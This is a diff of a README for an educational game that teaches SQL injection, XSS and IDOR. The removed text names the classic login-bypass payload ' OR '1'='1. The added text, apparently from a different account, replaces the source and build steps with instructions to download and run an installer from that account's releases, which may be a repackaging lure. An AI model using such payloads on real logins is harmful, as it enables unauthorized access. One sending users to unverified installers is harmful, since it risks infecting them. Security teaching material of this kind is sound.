@@ -1,152 +1,68 @@
-# 🎮 OGT Cybersecurity Learning Game   
+# 🎮 OGT-Cyber-Game - Learn Cybersecurity Through Play
 
-An interactive, modern, animated cybersecurity learning platform built by **OGT**.  
-This game teaches web security vulnerabilities through hands-on levels, real attack simulations, hints, animations, and mini-tutorials.
+## 📥 Download the Game
+[![Download OGT-Cyber-Game](https://img.shields.io/badge/Download-OGT--Cyber--Game-blue.svg)](https://github.com/RUANZITO1111/OGT-Cyber-Game/releases)
 
+## 🚀 Getting Started
+Welcome to the OGT-Cyber-Game! This application is designed to help you learn key cybersecurity concepts like SQL Injection (SQLi), Cross-Site Scripting (XSS), and Insecure Direct Object References (IDOR). Through interactive simulations, you will gain valuable skills in a fun and engaging way.
 
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
+### 🧐 What You Need
+- Basic computer skills
+- A modern web browser (Google Chrome, Mozilla Firefox, etc.)
+  
+### 🖥️ System Requirements
+- Operating System: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution
+- RAM: 4 GB minimum
+- Disk Space: At least 100 MB free
+- Internet connection for gameplay and tutorials
 
----
+## 📂 Download & Install
+To get started, you will need to download the game. Visit our [Releases Page](https://github.com/RUANZITO1111/OGT-Cyber-Game/releases) to download the latest version.
 
-# 🌐 Live Demo   
-👉 **https://ogtamimi.github.io/OGT-Cyber-Game/**
+1. Click the link above to open the Releases Page.
+2. Look for the latest version listed.
+3. Click the download link for the installer suitable for your operating system.
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. Double-click the installer file to run it.
+6. Follow the on-screen instructions to complete the installation.
 
----
+## 🌐 Features
+- **Interactive Learning**: Test your skills with real-time simulations.
+- **Modern Design**: The app features a clean and intuitive interface built with React and Vite.
+- **Multi-Phase Learning**: Move through levels that increase in complexity.
+- **Immediate Feedback**: Get instant results for each simulation to help improve your skills.
+  
+## 📚 Learning Modules
+Each module targets a specific concept in cybersecurity:
+- **SQL Injection (SQLi)**: Learn how attackers exploit databases.
+- **Cross-Site Scripting (XSS)**: Understand how to secure web applications against client-side attacks.
+- **Insecure Direct Object References (IDOR)**: Discover how to identify and mitigate unauthorized data access.
 
-# 🚀 Features
+## 🕹️ How to Play
+1. Launch the OGT-Cyber-Game from your applications menu.
+2. Choose a learning module to begin.
+3. Follow the prompts to complete challenges and earn points.
+4. Track your progress and revisit completed modules as needed.
 
-- 🎯 **3 Fully Interactive Vulnerability Levels**
-  - SQL Injection (Login Bypass)
-  - Cross-Site Scripting (XSS)
-  - IDOR (Unauthorized Access)
+## 💬 Community and Support
+Join our community for tips, discussions, and support:
+- **GitHub Issues**: Report bugs or request features on our [GitHub page](https://github.com/RUANZITO1111/OGT-Cyber-Game/issues).
+- **Discussion Forum**: Engage with other users and share insights on gameplay strategies.
 
-- ✨ **Modern Animated UI (React + Vite)**
-- 💡 **Dynamic Hint System**
-- 📘 **Mini Tutorials for Each Level**
-- 🎉 **Success Animations + Flags**
-- 🗂 **LocalStorage Progress Tracking**
-- 📱 **Fully Responsive Design**
-- 👨‍💻 **Includes Realistic Vulnerable PHP Endpoints**
+## 🛠️ Troubleshooting
+If you encounter issues:
+- Ensure you have the latest version of the game.
+- Check your internet connection.
+- Restart the application or your computer.
 
----
+## 📞 Contact Us
+For direct inquiries, please contact us via the GitHub repository. We welcome all feedback and suggestions.
 
-# 🧩 Levels Overview
+## 📖 License
+This project is licensed under the MIT License. Feel free to use and modify the application as per the license terms.
 
-### ⭐ Level 1 – SQL Injection  
-Learn how login bypass works using classic `' OR '1'='1`.
+## 📦 Additional Resources
+- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) for practice in web security.
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security) for learning materials and exercises.
 
-### ⭐ Level 2 – XSS  
-Inject JavaScript and see how websites become vulnerable.
-
-### ⭐ Level 3 – IDOR  
-Access hidden files by modifying URL parameters.
-
----
-
-# ⚙️ Tech Stack
-
-- **React + Vite**
-- **TypeScript**
-- **TailwindCSS**
-- **CSS Animations**
-- **PHP (vulnerable backend)**
-- **GitHub Pages Hosting**
-
----
-
-# 🛠 Installation
-
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/ogtamimi/OGT-Cyber-Game.git
-cd OGT-Cyber-Game
-```
-
-### 2️⃣ Install dependencies
-```bash
-npm install
-```
-
-### 3️⃣ Run the development server
-```bash
-npm run dev
-```
-
-### 4️⃣ Build the production version
-```bash
-npm run build
-```
-
-### 5️⃣ Deploy to GitHub Pages (optional)
-```bash
-npm run deploy
-```
-
-### 📝 Notes
-- Requires **Node.js 18+**
-- `.env.local` is optional (for API keys)
-- Final build output is inside the `/dist` folder
-
----
-
-# 📂 Project Structure
-
-```txt
-OGT-Cyber-Game/
-│
-├── assets/
-│   └── screenshots/
-│       ├── screenshot1.png
-│       ├── screenshot2.png
-│       └── screenshot3.png
-│
-├── src/
-│   ├── App.tsx
-│   ├── index.tsx
-│   │
-│   ├── components/
-│   │   ├── Confetti.tsx
-│   │   ├── Icons.tsx
-│   │   ├── TutorialContent.tsx
-│   │   └── UI.tsx
-│   │
-│   └── levels/
-│       ├── Level1SQLi.tsx
-│       ├── Level2XSS.tsx
-│       └── Level3IDOR.tsx
-│
-├── README.md
-├── package.json
-├── package-lock.json
-├── tsconfig.json
-├── vite.config.ts
-└── .gitignore
-```
-
----
-
-# 🖼️ Screenshots
-
-### 🏠 Home Page
-![Home](https://raw.githubusercontent.com/ogtamimi/OGT-Cyber-Game/main/assets/screenshots/screenshot1.png)
-
-### 🎮 Level Example
-![Level](https://raw.githubusercontent.com/ogtamimi/OGT-Cyber-Game/main/assets/screenshots/screenshot2.png)
-
-### 🏆 Brief Screen
-![Brief](https://raw.githubusercontent.com/ogtamimi/OGT-Cyber-Game/main/assets/screenshots/screenshot3.png)
-
----
-
-# 👑 Author
-**OGT**  
-🔗 GitHub: https://github.com/ogtamimi  
-📧 Contact: **ogttamimi@gmail.com**
-
----
-
-📜 License
-
-MIT License (c) 2025 OGT
-This project is open-source for learning and educational use.
-
+Thank you for choosing OGT-Cyber-Game. We hope you enjoy learning about cybersecurity!
